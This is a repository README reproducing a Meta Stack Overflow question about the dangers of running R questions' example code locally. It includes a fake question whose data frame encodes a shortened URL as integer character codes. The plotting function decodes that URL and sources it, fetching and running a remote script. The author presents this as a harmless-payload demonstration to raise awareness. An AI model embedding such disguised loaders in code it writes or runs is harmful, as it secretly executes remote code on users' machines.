# Stack Overflow security

This repo was created so I could upload a payload (`payload.R`) to demonstrate the risk of running apparently innocuous code from a Stack Overflow on a local machine. The payload only prints `I am running remote code`. However, it could be amended to include anything..

For full details, see the the actual [Stack Overflow question](https://meta.stackoverflow.com/questions/417164/risks-of-running-code-in-r-questions-locally).

I have pasted the question below:

# Risks of running code in R questions locally

The common advice for those asking questions on R Stack Overflow is to post [minimal reproducible example][1]. The expectation is that a small amount of data will be posted with the question to allow the problem to be replicated. Examples picked randomly from the last couple of days are [here][2] and [here][3]. When a user does not post data, usually a comment requesting they do so will be added (e.g. [here][4], [here][5]).

When answering questions, I usually glance at the code and if it seems OK, merrily copy the code and run it locally, watching for warnings or errors, prodding the variables and generally try to work out if anything unexpected is happening. The machine I run it on does not contain state secrets, but it will have some website passwords saved, and files I do not want to lose.

Although in all languages it is possible to obfuscate malicious code, in R I am worried there is a greater risk of this, as we expect questions to begin with a block of data, which is a perfect hiding place. Here is an example:

### Plot gridlines drawn on top of data points (fake question do not run)

I am having difficulty getting my data points to be drawn on top of my gridlines with base plot using `panel.first`. Here is some sample data:

```r
df  <- structure(list(source = c("facebook", "twitter", "youtube", "facebook",
"twitter", "youtube", "facebook", "twitter", "youtube", "facebook",
"twitter", "youtube", "facebook", "twitter", "youtube", "facebook",
"twitter"), word = structure(c("word1", "word2", "word3", "word4",
"word5", "word6", "word7", "word8", "word9", "word10", "word11",
"word12", "word13", "word14", "word15", "word16", "word17"), encoding = "intToUtf8"),
x = c(104L, 116L, 116L, 112L, 115L, 58L, 47L, 47L, 116L,
46L, 108L, 121L, 47L, 81L, 80L, 68L, 89L), y = c(146L, -9L,
-89L, 28L, 32L, -41L, -13L, 9L, -121L, 20L, -33L, 41L, 3L,
-88L, -1L, -71L, -176L)), row.names = c(NA, -17L), class = "data.frame")

df
#      source   word   x    y
# 1  facebook  word1 104  146
# 2   twitter  word2 116   -9
# 3   youtube  word3 116  -89
# 4  facebook  word4 112   28
# 5   twitter  word5 115   32
# <truncated>
```

This is my plotting function:

```r
draw_plot <- function(df, draw_text = TRUE, x_col_name = "x",
                      y_col_name = "y", text_column = "word",
                      text_color_column = "source", 
                      encoding = attr(df[[text_column]], "encoding")) {

    plot(
            df[[x_col_name]],
            df[[y_col_name]],
            col = factor(df[[text_color_column]]),
            xlab = x_col_name,
            ylab = y_col_name,
            panel.first = {
                axis(1, tck=1, col.ticks="light gray")
                x_text = do.call(encoding, list(df[[x_col_name]]))
                axis(1, tck=-0.015, col.ticks="black")
                axis(2, tck=1, col.ticks="light gray", lwd.ticks="1")
                sapply(x_text, text_color_column)
                axis(2, tck=-0.015)
                box()      
            }
    )
}

draw_plot(df)
```

### End fake question

The easiest way to answer this question would be to run the code and try to reproduce the issue. If you were to do so, it would return a plot, after printing the message `I am running arbitrary code`. The method is that it runs a remote script. The URL is encoded as utf-8 stored in `df$x`, and decoded in the plotting function. This script only prints that message and returns `TRUE`, but it could contain anything.

There are a few lines of code here that seem unnecessary, and anyone paying attention would spot a few red flags immediately. But questions often contain extraneous code and I do not automatically consider them malicious. I can certainly imagine missing a similar attack.

I know that the advice of security experts is that it is bonkers to copy and paste random code from the internet and run it on your local machine, even if looks OK.

On the other hand, the most secure thing might be to run such examples in a sandbox, on an air-gapped machine with no removeable media or copy/paste facilities. But the transaction costs of doing so are high enough that I would just never answer any questions. 

I suspect the probability of an attack like this is relatively small, particularly compared to the magnitude of other risks (e.g. I will install R packages from CRAN and github, and in other languages I'll `pip` or `npm` install packages all day long).

So my question is, what level of security is appropriate for answering SO questions? Is this something I actually need to worry about? What do others do about running code to answer questions?


  [1]: https://stackoverflow.com/a/5963610/12545041
  [2]: https://stackoverflow.com/questions/71702666/find-cluster-closest-to-predicted-coordinate
  [3]: https://stackoverflow.com/questions/71732071/how-to-change-the-position-of-labels-in-scale-x-continuous-in-ggplot2
  [4]: https://stackoverflow.com/questions/71708779/how-to-change-the-dimensions-of-the-graphs-output-in-the-grid-arrange-function
  [5]: https://stackoverflow.com/questions/71726615/how-do-you-make-a-barplot-in-ggplot2-with-dodged-bars-and-different-scales-for